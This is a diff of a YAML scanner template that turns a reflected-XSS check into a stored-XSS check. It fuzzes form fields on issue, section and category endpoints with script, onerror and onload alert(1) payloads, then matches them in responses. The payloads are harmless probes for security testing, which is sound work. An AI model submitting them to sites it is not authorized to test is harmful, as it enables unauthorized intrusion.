@@ -1,27 +1,40 @@
-id: xss-reflected
-name: Reflected XSS
+id: xss-stored
+name: stored XSS
 severity: high
-type: fuzz
+type: form_xss   # ← ubah dari "fuzz" ke "form_xss"
+
+# Pattern AJAX endpoint yang perlu di-load untuk dapat form-nya
+ajax_patterns:
+  - "future-issue-grid"
+  - "back-issue-grid"  
+  - "add-issue"
+  - "edit-issue"
+  - "update-issue"
+  - "add-section"
+  - "add-category"
 
 requests:
-  - method: GET
-    targets: [query_params]
+  - method: POST
     fuzzing:
       - mode: replace
+        # Field mana yang di-fuzz (regex match nama field)
+        params_pattern: "volume|number|year|title|description|urlPath"
         payloads:
           - "<script>alert(1)</script>"
           - "<img src=x onerror=alert(1)>"
           - "'\"><svg onload=alert(1)>"
-          - "javascript:alert(1)"
+          - "<body onload=alert(1)>"
+          - "\"><script>alert(1)</script>"
 
 matchers:
+  - type: status
+    status: [200]
   - type: word
     part: body
     condition: or
+    negate: false
     words:
       - "<script>alert(1)</script>"
       - "onerror=alert(1)"
       - "onload=alert(1)"
-
-  - type: status
-    status: [200]
+      - "svg onload"
